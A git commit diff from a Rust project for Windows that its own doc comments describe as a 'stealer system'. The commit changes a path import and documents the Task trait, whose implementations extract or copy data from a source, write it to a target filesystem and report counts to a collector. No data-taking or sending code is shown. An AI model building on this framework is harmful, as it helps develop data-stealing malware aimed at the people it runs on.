c589ae019042badc13d4c8ed0a8cde448469c506
sqlerrorthing <148702857+sqlerrorthing@users.noreply.github.com>
2025-07-22 17:08:22 +0800

    tasks docs (why not)

--- tasks/src/lib.rs
+++ tasks/src/lib.rs
@@ -10,8 +10,8 @@ use alloc::vec::Vec;
 use collector::Collector;
 use core::ffi::c_void;
 use core::ptr::null_mut;
+use filesystem::path::Path;
 use filesystem::FileSystem;
-use utils::path::Path;
 use windows_sys::Win32::Foundation::CloseHandle;
 use windows_sys::Win32::Foundation::HANDLE;
 use windows_sys::Win32::Foundation::TRUE;
@@ -41,7 +41,7 @@ macro_rules! parent_name {
 macro_rules! impl_composite_task_runner {
     ($task_type:ty) => {
         impl<C: collector::Collector, F: filesystem::FileSystem> Task<C, F> for $task_type {
-            fn run(&self, parent: &utils::path::Path, filesystem: &F, collector: &C) {
+            fn run(&self, parent: &filesystem::path::Path, filesystem: &F, collector: &C) {
                 self.inner.run(parent, filesystem, collector);
             }
         }
@@ -51,18 +51,50 @@ macro_rules! impl_composite_task_runner {
         impl<C: collector::Collector, F: filesystem::FileSystem> Task<C, F> for $task_type {
             $crate::parent_name!($parent_name);
 
-            fn run(&self, parent: &utils::path::Path, filesystem: &F, collector: &C) {
+            fn run(&self, parent: &filesystem::path::Path, filesystem: &F, collector: &C) {
                 self.inner.run(parent, filesystem, collector);
             }
         }
     };
 }
 
+/// Trait representing a unit of work ("task") in a stealer system.
+///
+/// A task is responsible for extracting or copying data from a source
+/// and writing its results to a target filesystem. It may also report
+/// statistics about its actions using a `Collector`.
+///
+/// # Type Parameters
+///
+/// * `C` - The type of the statistics collector, implementing the [`Collector`] trait.
+/// * `F` - The type of the destination filesystem, implementing the [`FileSystem`] trait.
 pub trait Task<C: Collector, F: FileSystem>: Send + Sync {
+    /// Returns the optional name of this task's output subdirectory.
+    ///
+    /// If `Some(name)` is returned, the task's output will be stored under `parent / name`.
+    /// If `None`, the output is written directly into the `parent` directory.
+    ///
+    /// This allows a task to define its own output folder/file name if needed.
     fn parent_name(&self) -> Option<String> {
         None
     }
 
+    /// Executes the task.
+    ///
+    /// # Parameters
+    ///
+    /// * `parent` - The parent path under which the task should store its output.
+    ///   If `parent_name()` returns `Some(name)`, the task should store results in `parent / name`.
+    ///
+    /// * `filesystem` - The filesystem to which this task should write its output data.
+    ///
+    /// * `collector` - The statistics collector to record what and how much was collected.
+    ///   Used for reporting and telemetry, e.g., number of files, total bytes, etc.
+    ///
+    /// # Notes
+    ///
+    /// Implementations should avoid panicking. All data output should be stored
+    /// under the provided `parent` directory or a subfolder derived from it.
     fn run(&self, parent: &Path, filesystem: &F, collector: &C);
 }
 
